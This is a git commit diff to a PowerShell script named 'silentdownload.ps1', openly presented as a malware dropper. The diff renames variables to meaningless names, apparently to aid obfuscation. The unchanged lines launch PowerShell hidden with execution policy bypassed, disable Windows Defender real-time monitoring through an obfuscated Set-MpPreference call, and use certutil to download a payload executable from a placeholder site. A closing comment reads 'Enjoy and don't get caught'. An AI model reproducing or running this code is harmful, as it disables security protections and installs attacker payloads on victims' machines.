10678ffb3fd7301396830b88e1f5b35ee9d5d519
John Fawcett <43934323+jwfawcett@users.noreply.github.com>
2025-12-05 15:26:59 -0500

    Update silentdownload.ps1

--- silentdownload.ps1
+++ silentdownload.ps1
@@ -4,10 +4,10 @@
 # powershell.exe -NoPr -WINd 1 -eXEc ByP 
 
 #change variable
-$sitename = "https://sitename"
+$ABABAB = "https://sitename"
 
 #change variable
-$filename = "$file.exe"
+$ACACAC = "$file.exe"
 
 # Disables Defender Real Time Monitoring 
 
@@ -16,7 +16,7 @@ InVOKe-cOMMAnd -"coMputEr"NaME %s -s"c"R"i"Ptb"l"O"c"k { s"Et-Mpp"RE"Fe"R"ENcE" 
 Start-Sleep -Seconds 5
 
 # uses certutil  lolbas to load payload 
-cerTuTIl.Exe -Ur"Lcac"HE -f $sitename $filename
+cerTuTIl.Exe -Ur"Lcac"HE -f $ABABAB $ACACAC
 
 # Remove Comments. Enjoy and don't get caught
 
